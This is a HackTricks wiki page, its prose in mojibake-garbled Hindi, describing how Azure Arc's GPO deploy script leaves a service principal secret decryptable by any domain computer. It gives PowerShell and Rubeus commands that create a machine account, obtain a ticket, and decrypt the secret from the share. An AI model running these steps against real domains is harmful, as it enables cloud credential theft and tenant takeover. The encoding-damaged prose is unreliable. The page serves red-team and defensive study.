# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure Arc рдирдП рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ (рдЬреБрдбрд╝реЗ рд╣реБрдП рдбреЛрдореЗрди рд╕рд░реНрд╡рд░) рдХреЛ Azure Arc рдореЗрдВ Group Policy Object рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреАрдХреГрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕реЗ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, Microsoft рдПрдХ рддреИрдирд╛рддреА рдЙрдкрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред ArcEnableServerGroupPolicy.zip рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯреЗрдВ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ: DeployGPO.ps1, EnableAzureArc.ps1, рдФрд░ AzureArcDeployment.psm1ред

рдЬрдм рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ DeployGPO.ps1 рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИ:

1. рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдХреЗ рднреАрддрд░ Azure Arc Servers Onboarding GPO рдмрдирд╛рддреА рд╣реИред
2. EnableAzureArc.ps1 рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдСрдирдмреЛрд░реНрдбрд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рдЧрдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ Windows рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдкреИрдХреЗрдЬ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИред

рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛рддреЗ рд╕рдордп, рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рджреЛ рдореБрдЦреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ: **ServicePrincipalId** рдФрд░ **ServicePrincipalClientSecret**ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЗрд╕реЗ рдбреЛрдореЗрди, рд╢реЗрдпрд░ рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдХрд╛ FQDN, рдФрд░ рд╢реЗрдпрд░ рдирд╛рдо рдЬреИрд╕реЗ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЯреЗрдиреЗрдЯ рдЖрдИрдбреА, рд╕рдВрд╕рд╛рдзрди рд╕рдореВрд╣, рдФрд░ рдЕрдиреНрдп рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рд╡рд┐рд╡рд░рдг рднреА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╣реЛрдВрдЧреЗред

DPAPI-NG рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╢реЗрдпрд░ рдкрд░ AzureArcDeploy рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдХреНрд░реЗрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╕реАрдХреНрд░реЗрдЯ рдХреЛ encryptedServicePrincipalSecret рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкреНрд░рдорд╛рдг DeployGPO.ps1 рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ $descriptor рдФрд░ $ServicePrincipalSecret рдХреЛ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдореЗрдВ рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рдФрд░ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕рдореВрд╣ SIDs рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ ServicePrincipalSecret рдХреЛ рдХреЗрд╡рд▓ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдФрд░ рдбреЛрдореЗрди рдХрдВрдкреНрдпреВрдЯрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣реЛрдВ рджреНрд╡рд╛рд░рд╛ рд╣реА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд░реНрддреЗрдВ рд╣реИрдВ:

1. рд╣рдо рдЖрдВрддрд░рд┐рдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╡реЗрд╢ рдХрд░ рдЪреБрдХреЗ рд╣реИрдВред
2. рд╣рдорд╛рд░реЗ рдкрд╛рд╕ Active Directory рдХреЗ рднреАрддрд░ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛рдиреЗ рдпрд╛ рдЙрд╕ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред
3. рд╣рдордиреЗ AzureArcDeploy рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реИред

AD рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдПрдХ рдорд╢реАрди рдЦрд╛рддреЗ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдорд╢реАрди рдЦрд╛рддрд╛ рдХреЛрдЯрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╣реИред рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдХрдордЬреЛрд░ ACLs рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреНрдп рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд╢реАрди рдЦрд╛рддреЗ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реИред
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
рдПрдХ рдмрд╛рд░ рдорд╢реАрди рдЦрд╛рддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рдЗрд╕ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рд╣рдо рдпрд╛ рддреЛ netonly рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде runas.exe рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ Rubeus.exe рдХреЗ рд╕рд╛рде рдкрд╛рд╕-рдереА-рдЯрд┐рдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
рд╣рдорд╛рд░реА рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХреЗ рд▓рд┐рдП TGT рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдХреЗ, рд╣рдо рд╕реЗрд╡рд╛ рдкреНрд░рдореБрдЦ рдЧреБрдкреНрдд рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╣рдо [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд╣рдо ArcInfo.json рдлрд╝рд╛рдЗрд▓ рд╕реЗ Azure рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╢реЗрд╖ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдбServicePrincipalSecret рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╡рд┐рд╡рд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИрдВ: TenantId, servicePrincipalClientId, ResourceGroup, рдФрд░ рдЕрдзрд┐рдХред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рд╣рдо Azure CLI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рд╕реЗрд╡рд╛ рдкреНрд░рдореБрдЦ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рд╕рдВрджрд░реНрдн

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
